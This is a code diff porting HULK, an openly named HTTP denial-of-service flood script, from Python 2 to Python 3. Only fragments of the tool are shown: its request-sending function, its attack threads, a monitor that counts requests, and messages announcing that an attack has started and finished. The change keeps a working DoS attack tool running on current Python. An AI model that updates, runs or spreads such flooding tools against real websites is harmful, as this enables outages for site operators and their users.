@@ -7,7 +7,7 @@
 #
 # author :  Barry Shteiman , version 1.0
 # ----------------------------------------------------------------------------------------------
-import urllib2
+import urllib.request as urllib2
 import sys
 import threading
 import random
@@ -69,10 +69,10 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
-	print 'you can add "safe" after url, to autoshut after dos'
-	print '---------------------------------------------------'
+	print( '---------------------------------------------------')
+	print( 'USAGE: python hulk.py <url>')
+	print ('you can add "safe" after url, to autoshut after dos')
+	print( '---------------------------------------------------')
 
 	
 #http request
@@ -94,12 +94,12 @@ def httpcall(url):
 	request.add_header('Host',host)
 	try:
 			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
+	except urllib2.HTTPError as e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+			print ('Response Code 500')
 			code=500
-	except urllib2.URLError, e:
+	except urllib2.URLError as e:
 			#print e.reason
 			sys.exit()
 	else:
@@ -116,7 +116,7 @@ class HTTPThread(threading.Thread):
 				code=httpcall(url)
 				if (code==500) & (safe==1):
 					set_flag(2)
-		except Exception, ex:
+		except Exception as ex:
 			pass
 
 # monitors http threads and counts requests
@@ -124,11 +124,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+			if (previous+100<request_counter) & (previous!=request_counter):
+				print ("%d Requests Sent"% (request_counter)) 
 				previous=request_counter
 		if flag==2:
-			print "\n-- HULK Attack Finished --"
+			print ("\n-- HULK Attack Finished --")
 
 #execute 
 if len(sys.argv) < 2:
@@ -139,7 +139,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- HULK Attack Started --"
+		print ("-- HULK Attack Started --")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
